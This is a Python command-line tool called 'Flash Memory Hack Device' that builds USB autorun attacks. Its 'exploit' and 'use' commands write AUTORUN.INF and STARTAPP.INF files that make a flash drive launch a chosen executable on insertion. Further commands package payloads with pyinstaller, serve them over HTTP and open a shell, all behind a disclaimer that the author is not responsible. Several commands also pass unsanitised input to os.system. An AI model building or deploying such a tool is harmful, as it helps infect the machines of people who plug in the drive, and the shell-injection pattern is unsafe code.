#! /usr/bin/dev python3
#@hackerone4x
import os, time , shutil 
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
d = "\033[2;37m"
R = "\033[1;41m"
Y = "\033[1;43m"
B = "\033[1;44m"
w = "\033[0m"
os.system('mkdir "ExpSRC/OpenFile"')
try:
    def banner():
        print(w+d+"      ,,                ,,")
        print(w+d+"    (((((              )))))")
        print(w+d+"   ((((((              ))))))   "    +w+b+"{"+r+"F"+w+"lash"+" "+r+"M"+w+"emory"+" "+r+"H"+w+"ack"+" "+r+"D"+w+"evice"+w+b+"}")
        print(w+d+"   ((((((              ))))))")
        print(w+d+"    ((((("+w+b+",r@@@@@@@@@@e,"+w+d+")))))")
        print(w+d+"      ((("+w+b+"@@@@@@@@@@@@@@@@"+w+d+")))    "+w+r+"FMHD"+b+" - "+d+"version 1.0")
        print(w+b+"      \@@/"+r+",:::,"+w+b+"\/"+r+",:::,"+w+b+"\@@       "+w+"------------------")
        print(w+b+"     /@@@|"+r+":::::"+w+b+"||"+r+":::::"+w+b+"|@@@\\     "+w+"Author by "+y+"@HackerOne4X")
        print(w+b+"    / @@@\\"+r+"':::'"+w+b+"/\\"+r+"':::'"+w+b+"/@@@ \\    "+w+"The author is not responsible")
        print(w+b+"   /  /@@@@@@@//\\\@@@@@@@\  \\   "+w+"for any issues or damage")
        print(w+b+"  (  /  '@@@@@====@@@@@'  \  )  "+w+"caused by this program")
        print(w+b+"   \(     /          \     )/")
        print(w+b+"     \   (            )   /")
        print(w+b+"          \          /"+w)
        print("                                                                            ")
        
    banner()
    def mainshell():
        while True:
            print("")
            oo = input((w+b+"root@ "+y+"{"+r+"F"+w+"lash"+" "+r+"M"+w+"emory"+" "+r+"H"+w+"ack"+" "+r+"D"+w+"evice"+y+"}"+w+b+" $ "+g))
            if oo == "help":
                print('''
        help            to display all commands
        ls              to show files and dirs in list
        pwd             to show the path of this 
        convertp        to convert python file to exe
        crt             to create a exploit file
        show            to show data in web page
        exploit         to make an exploit file
        cls             to clear exploit files and display
        use             to use an exploit
        shell           to start a command prompt
        bon             to start a server (http) on the network
        lon             to start listener to exploit '''+r+"{NETWORK_LISTENERS}"+w
        )
            elif oo == "convertp":
                print(r+"{"+g+"P"+r+"}"+y+"please put the file in this dir"+w)
                op = input(b+"What is the name of the file : "+g)
                os.system("pyinstaller --onefile '"+op+"'") 
            elif oo == "show":
                os.system("SHOWASR.BAT")
                os.system("mkdir WWW")
                oio = open('WWW/html.html' , 'a')

                ouo = open('data.txt' , 'r')
                av = ouo.readlines()
                oio.writelines(av)

                oio.close()
                ouo.close()

                oio.writelines()
            elif oo == "exploit":
                def exp():
                    pop = open('ExpSRC/AUTORUN.INF' , 'a')
                    pos = open('ExpSRC/OpenFile/STARTAPP.INF' , 'a')
                    #olo = os.system("cd ExpSRC mkdir OpenFile")
                    
                    ins = "[AutoRun]"
                    inv = input("[*] What is the name of the programe to start in biggest : ")
                    data1 = (ins + "\n" + "OPEN="+inv)
                    pop.writelines(data1)

                    insc = "[Settings]"
                    oml = '''[Data]
FS = 732112
HV = 6752325F9F6AAD151328342CD6080FEC
DA = 2022-07-23
TI = 23:22'''
                    data2 = (insc + "\n" +"ApplicationToStart = "+ inv + "\n" + oml)
                    pos.writelines(data2)
                    shutil.copyfile('STARTAPP.EXE' , 'ExpSRC/OpenFile/STARTAPP.EXE')
                    print("[*] {w}  Please Put Your Exploit File In This Path ")
                    shutil.copyfile(inv , 'ExpSRC/'+inv)

                    pos.close()
                    pop.close()

                
                exp()

            elif oo == "cls":
                os.system("PowerShell cls")
                banner()
            elif oo == "use":
                osd = input(">")
                shutil.copyfile(osd , 'ExpSRC/'+osd)
                pops = open('ExpSRC/AUTORUN.INF' , "a")
                poss = open('ExpSRC/OpenFile/STARTAPP.INF' , "a")
                ins = "[AutoRun]"
                data3 = (ins + "\n" + "OPEN="+osd)
                pops.writelines([data3])
                insc = "[Settings]"
                oml = '''[Data]
FS = 732112
HV = 6752325F9F6AAD151328342CD6080FEC
DA = 2022-07-23
TI = 23:22'''   
                data4 = (insc+"\n"+"ApplicationToStart = "+osd+"\n"+oml)
                poss.writelines(data4)
                shutil.copyfile('STARTAPP.EXE' , 'ExpSRC/OpenFile/STARTAPP.EXE')

                poss.close()
                pops.close()

            elif oo == "shell":
                os.system("cmd")
            elif oo == "":
                mainshell()
            elif oo == "bon":
                host = input(w+b+"["+r+"*"+w+b+"]"+w+" What Is The Host Of The Server "+r+": "+y)
                port = input(w+b+"["+r+"*"+w+b+"]"+w+" What Is The Port Of The Server "+r+": "+y)
                hdir = input(w+b+"["+r+"*"+w+b+"]"+w+" What Is The Dir Of Server "+r+": "+y)

                os.system("python -m http.server -b "+host+" -d "+hdir+" "+port)
            elif oo == "lon":
                hosts = input(w+b+"["+r+"*"+w+b+"]"+w+" What Is The Host Of The Server "+r+": "+y)
                ports = input(w+b+"["+r+"*"+w+b+"]"+w+" What Is The Port Of The Server "+r+": "+y)


                os.system('"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --flag-switches-begin --flag-switches-end '+" http://"+hosts+":"+ports)
            
            elif oo == "crt":
                _nm = input(y+"Name Of The File : "+g)
                _lo = input(r+">>>"+w)
                os.system('echo '+_lo+" >> "+_nm)
            elif oo == "pwd":
                os.system("PowerShell pwd")
            elif oo == "ls":
                os.system("PowerShell ls")
            else:
                print(w+b+"{"+r+" ERROR "+w+b+"}"+w+" error in input operation .")
    mainshell()
except KeyboardInterrupt:
    print("\n"+r+"Ketboard Interrupt "+w)
    time.sleep(5)
